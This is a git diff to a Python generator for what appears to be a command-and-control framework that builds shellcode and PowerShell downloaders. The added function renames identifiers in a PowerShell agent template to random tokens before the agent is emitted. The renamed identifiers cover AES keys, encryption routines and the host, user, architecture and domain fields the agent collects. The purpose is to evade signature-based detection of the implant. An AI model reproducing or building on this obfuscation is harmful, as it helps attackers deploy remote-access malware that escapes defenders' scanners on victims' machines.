@@ -349,6 +349,56 @@ def generate_x86_shellcode(hostname, path, proto_to_use):
         print(colored("[-] Unable to generate shellcode!", "red"))
 
 
+def random_powershell_generator(powershell_code):
+    token1 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token2 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token3 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token4 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token5 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token6 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token7 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token8 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token9 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token10 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token11 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token12 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token13 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token14 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token15 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token16 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token17 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token18 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+    token19 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
+
+    tokens_to_replace = {
+    "TASK_CHECK_INTERVAL": token1,
+    "AES_KEY": token2,
+    "AES_IV": token3,
+    "aesManaged": token4,
+    "Create-AesManagedObject": token5,
+    "EncryptAES": token6,
+    "DecryptAES": token7,
+    "unencryptedData": token8,
+    "wc3h": token9,
+    "EncodedText": token10,
+    "wc3": token11,
+    "randommm": token12,
+    "encryptorrr": token13,
+    "whoamiii": token14,
+    "fhstname": token15,
+    "hehehe": token16,
+    "arch22": token17,
+    "osos": token18,
+    "dddomain": token19
+
+    }
+
+    for token in tokens_to_replace:
+        powershell_code = powershell_code.replace(token, tokens_to_replace[token])
+
+    return powershell_code
+
+
 
 def generate_exe_powershell_downloader(hostname, path, proto, output_path):
 	if os.system("which mono-csc") == 0:
@@ -449,7 +499,8 @@ def replace_agent_config_vars(template_str, server_http_protocol, server_hostnam
     pcode = pcode.replace("OCU_PROTO", server_http_protocol)
     pcode = pcode.replace("SRVHOST", server_hostname)
     pcode = pcode.replace("OCT_AKILL", str(auto_kill))
-    return pcode
+    final_code = random_powershell_generator(pcode)
+    return final_code
 
 
 def banner():
